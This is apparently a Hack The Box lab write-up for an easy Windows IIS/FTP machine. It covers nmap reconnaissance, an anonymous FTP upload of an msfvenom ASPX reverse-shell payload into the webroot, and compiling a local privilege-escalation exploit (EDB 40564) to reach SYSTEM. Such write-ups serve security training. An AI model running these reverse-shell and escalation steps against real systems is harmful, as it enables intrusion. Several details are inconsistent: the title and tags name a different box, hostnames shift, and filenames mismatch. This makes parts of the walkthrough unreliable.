---
title: "Active"
difficulty: Easy
os: Windows
points: 20
rating: 4.9
date: 2018-07-28
avatar: assets/htb/active.png
tags: [Default Credentials, Weak Permissions, Anonymous/Guest Access, Reconnaissance, Password Cracking, Kerberoasting, SMB, Kerberos]
htb_url: https://app.hackthebox.com/machines/Active
---
## Summary

Active is an Easy Windows box running Microsoft IIS 7.5 and Microsoft FTP. Anonymous FTP login is permitted and the FTP root maps directly to the IIS webroot, so an `.aspx` reverse-shell payload can be uploaded and then executed through the web server to land a shell as `iis apppool\web`. The host runs an old build of Windows (6.1.7600), which is vulnerable to a local privilege escalation exploit (EDB 40564) that hands over `nt authority\system`.

## Enumeration

I started by setting up a working environment and adding the target to my hosts file.

```bash
su
echo "<YOUR_IP> bank.htb" >> /etc/hosts

mkdir -p htb/bank.htb
cd htb/bank.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I like to kick off recon with a ping against the target, which confirms reachability and hints at the OS.

```bash
ping -c 3 devel.htb    
PING devel.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=1 ttl=127 time=57.1 ms
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=2 ttl=127 time=53.6 ms
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=3 ttl=127 time=56.2 ms
```

From these three ICMP replies the TTL sits around 128, which points to a Windows host; \*nix machines typically report a TTL near 64.

### Port scanning

I ran a fast full-port SYN scan to find every open port.

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 devel.htb -oG port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 15:32 EDT
Initiating SYN Stealth Scan at 15:32
Scanning devel.htb (<YOUR_IP>) [65536 ports]
Discovered open port 80/tcp on <YOUR_IP>
Discovered open port 21/tcp on <YOUR_IP>
Completed SYN Stealth Scan at 15:32, 26.41s elapsed (65536 total ports)
Nmap scan report for devel.htb (<YOUR_IP>)
Host is up, received user-set (0.057s latency).
Scanned at 2023-07-24 15:32:23 EDT for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```

Only two ports are exposed on the box: 21 and 80. Next I enumerated the services behind those ports with a scripted version scan.

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

```bash
nmap -p21,80 -n -Pn -vvv -sCV --min-rate 5000 devel.htb -oN open_ports
```

```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 07-24-23  11:15AM               241062 40564.exe
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 07-24-23  01:26AM                 1442 cmdasp.aspx
| 07-24-23  12:36AM                 2914 devel.aspx
| 07-24-23  01:04AM                 2886 devel1.aspx
| 07-24-23  04:44PM                 2917 devel2.aspx
| 07-24-23  02:11AM                 2749 develshell.aspx
| 07-24-23  11:09AM                15966 fox.aspx
| 07-24-23  09:26AM                 2906 hacked.aspx
| 03-17-17  05:37PM                  689 iisstart.htm
| 07-24-23  07:16PM                    0 killbill.aspx
| 07-24-23  07:21PM                 2912 killbill1.aspx
| 07-24-23  12:17AM                 2783 pwned.aspx
| 07-24-23  03:00PM                 2923 rev.aspx
| 07-24-23  09:21PM                15969 shell.aspx
| 07-24-23  03:34PM                73802 virus.exe
| 07-24-23  12:34AM               112815 virus2.exe
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Port 21 is running **Microsoft ftpd**, and crucially `ftp-anon` reports that anonymous FTP login is allowed. Port 80 is **Microsoft IIS httpd 7.5**.

## Foothold

### Anonymous FTP and webroot mapping

I logged in to FTP anonymously and listed the available commands. A single file is uploaded with the `put` command.

```bash
ftp devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
Name (devel.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> help
Commands may be abbreviated.  Commands are:

!		cr		ftp		macdef		msend		prompt		restart		sunique
$		debug		gate		mdelete		newer		proxy		rhelp		system
account		delete		get		mdir		nlist		put		rmdir		tenex
append		dir		glob		mget		nmap		pwd		rstatus		throttle
ascii		disconnect	hash		mkdir		ntrans		quit		runique		trace
bell		edit		help		mls		open		quote		send		type
binary		epsv		idle		mlsd		page		rate		sendport	umask
bye		epsv4		image		mlst		passive		rcvbuf		set		unset
case		epsv6		lcd		mode		pdir		recv		site		usage
cd		exit		less		modtime		pls		reget		size		user
cdup		features	lpage		more		pmlsd		remopts		sndbuf		verbose
chmod		fget		lpwd		mput		preserve	rename		status		xferbuf
close		form		ls		mreget		progress	reset		struct		?

```

To confirm whether files dropped into the FTP root are served by the web server, I uploaded the nmap output file (`port_scan`) and listed the directory to see it appear alongside the existing `.aspx` files.

```bash
ftp> put port_scan 
local: port_scan remote: port_scan
229 Entering Extended Passive Mode (|||49219|)
150 Opening ASCII mode data connection.
100% |***************************************************************************************|   464        8.84 MiB/s    --:-- ETA
226 Transfer complete.
464 bytes sent in 00:00 (7.98 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49220|)
125 Data connection already open; Transfer starting.
07-24-23  11:15AM               241062 40564.exe
03-18-17  02:06AM       <DIR>          aspnet_client
07-24-23  01:26AM                 1442 cmdasp.aspx
07-24-23  12:36AM                 2914 devel.aspx
07-24-23  01:04AM                 2886 devel1.aspx
07-24-23  04:44PM                 2917 devel2.aspx
07-24-23  02:11AM                 2749 develshell.aspx
07-24-23  11:09AM                15966 fox.aspx
07-24-23  09:26AM                 2906 hacked.aspx
03-17-17  05:37PM                  689 iisstart.htm
07-24-23  07:16PM                    0 killbill.aspx
07-24-23  07:21PM                 2912 killbill1.aspx
07-24-23  10:57PM                  464 port_scan
07-24-23  12:17AM                 2783 pwned.aspx
07-24-23  03:00PM                 2923 rev.aspx
07-24-23  09:21PM                15969 shell.aspx
07-24-23  03:34PM                73802 virus.exe
07-24-23  12:34AM               112815 virus2.exe
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

The file lands in the directory served by IIS, so uploaded content is reachable via the web server. Since this is an IIS host, the file extension executed as a script here is `aspx` — exactly the type of payload I want to plant.

### ASPX reverse shell

With write access to the webroot confirmed, I used msfvenom to build an aspx reverse-shell payload that I would upload through FTP. `LHOST` is my local IP, and `LPORT` is the port netcat will listen on for the callback.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=444 -f aspx > exploit.aspx
Payload size: 327 bytes
Final size of aspx file: 2748 bytes
```

I uploaded the payload over FTP.

```bash
ftp> put script.aspx
local: script.aspx remote: script.aspx
229 Entering Extended Passive Mode (|||49224|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|  2748        1.12 MiB/s    --:-- ETA
226 Transfer complete.
2748 bytes sent in 00:00 (45.20 KiB/s)
```

I started a netcat listener on port 444 and browsed to the uploaded script to trigger it, which gave me a shell.

```bash
c:\Windows>whoami
whoami
iis apppool\web
```

I landed as the `iis apppool\web` account. The user flag should be on the `babis` user's desktop, but that directory is off-limits to this low-privileged account — searching recursively for `user.txt` from `C:\` returns nothing.

```bash
where /r C:\ user.txt
```

To reach the `babis` directory I'll need to escalate privileges.

## Privilege Escalation

I gathered OS details with `systeminfo`.

```
systeminfo
```

```
OS Version: 6.1.7600 N/A Build 7600
```

That build is ancient. As a recon helper, Metasploit's `post/multi/recon/local_exploit_suggester` module can be used to list possible privilege escalation paths on a compromised system:

```bash
msfconsole
```

```bash
search post/multi/recon
```

A quick search for the OS version turns up this [exploit](https://www.exploit-db.com/exploits/40564) matching Build 7600. I grabbed the `40564.c` source and compiled it with mingw32.

```bash
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

I reconnected to FTP in binary mode and uploaded `exploit.exe`, then located it with the `where` command and executed it to elevate.

```bash
where /r C:\ exploit.exe
c:\inetpub\wwwroot>exploit.exe
whoami
nt authority\system
```

### Reading the flags

Now running as `nt authority\system`, both flags are easy to track down with `where` in recursive mode (`/r`) starting from the root folder (`C:\`).

```
where /r C:\ user.txt
C:\Users\babis\Desktop\user.txt
```

I read the user flag with the `type` command (the Windows equivalent of `cat` on \*nix).

```
type C:\Users\babis\Desktop\user.txt
```

**user.txt** — `5d3f************************16bd`

The same approach gets the root flag.

```bash
where /r C:\ root.txt
C:\Users\Administrator\Desktop\root.txt
```

```bash
type C:\Users\Administrator\Desktop\root.txt
```

**root.txt** — `cb43************************2f32`

---
